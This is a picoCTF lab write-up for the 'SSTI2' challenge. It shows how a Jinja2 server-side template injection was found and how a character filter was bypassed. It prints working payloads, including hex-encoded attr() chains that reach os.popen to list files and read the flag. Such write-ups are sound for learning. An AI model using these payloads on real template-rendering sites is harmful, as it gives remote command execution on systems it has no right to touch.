# Day 22 – picoCTF Web Exploitation Challenge

## Challenge Name
SSTI2

## Category
Web Exploitation

## Difficulty
Medium

## Description / Problem Statement
**Author:** Venax  

I made a cool website where you can announce whatever you want!  
I read about input sanitization, so now I remove any kind of characters that could be a problem :)  
I heard templating is a cool and modular way to build web apps!

**URL:**  
http://shape-facility.picoctf.net:54951/

---

## Objective
To exploit a Server-Side Template Injection (SSTI) vulnerability while bypassing input sanitization filters in order to execute server-side commands and read the flag.

---

## Commands / Techniques Learned
- Server-Side Template Injection (SSTI)
- Jinja2 Template Exploitation
- Filter Bypass Techniques
- Hex Encoding for Restricted Characters
- Server-Side Command Execution

---

## Methodology

1. Opened the challenge URL in a web browser.
2. The homepage displayed an input field asking: What do you want to announce?

<img width="1919" height="963" alt="Screenshot 2026-01-22 212633" src="https://github.com/user-attachments/assets/8b83b3df-bc3b-49af-8244-acd839376829" />

3. Entered a simple input: Hello and submitted it.

<img width="1919" height="966" alt="Screenshot 2026-01-22 212658" src="https://github.com/user-attachments/assets/c46b6c1b-23a1-492f-941e-653c3597287f" />

4. The application rendered: Hello confirming that user input was being processed by a **server-side template engine**.

<img width="1919" height="965" alt="Screenshot 2026-01-22 212710" src="https://github.com/user-attachments/assets/a02c4d7e-b570-4f6e-baed-aa05ad6ae82b" />

5. Based on the challenge name **SSTI2** and application behavior, inferred that the site might be vulnerable to **Server-Side Template Injection**.
6. Tested a known SSTI payload targeting Jinja2 to execute OS commands: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

<img width="1918" height="969" alt="Screenshot 2026-01-22 222412" src="https://github.com/user-attachments/assets/01646f59-bf2b-436e-b3a5-40cd3c93be2a" />

7. The application returned: Stop trying to break me >:( indicating that certain characters (such as `_` and `.`) were being filtered.

<img width="1919" height="964" alt="Screenshot 2026-01-22 221355" src="https://github.com/user-attachments/assets/10048769-210f-4368-83df-b017488979b8" />

8. To bypass the input sanitization, used **hex-encoded representations** of restricted characters (e.g., `_` → `\x5f`).
9. Crafted a modified SSTI payload using encoded attribute names:{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

<img width="1919" height="967" alt="Screenshot 2026-01-22 215429" src="https://github.com/user-attachments/assets/d1e9db10-e908-4917-b9eb-774b00994b0c" />

10. Submitted the payload and observed a list of files present on the server.
11. Identified a file named: flag

<img width="1919" height="968" alt="Screenshot 2026-01-22 215536" src="https://github.com/user-attachments/assets/0e815c32-51a1-4da7-9dd9-73ae7eca1aeb" />

12. Modified the payload to read the contents of the flag file: {{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

<img width="1919" height="967" alt="Screenshot 2026-01-22 215429" src="https://github.com/user-attachments/assets/700f0250-1aad-4997-a3a4-2459ae7c504d" />

13. Submitted the payload.
14. The server executed the command and returned the flag.

<img width="1919" height="945" alt="Screenshot 2026-01-22 215729" src="https://github.com/user-attachments/assets/892af7a6-731d-408b-8e76-fee62e87c3fb" />

---

## Flag (Masked)
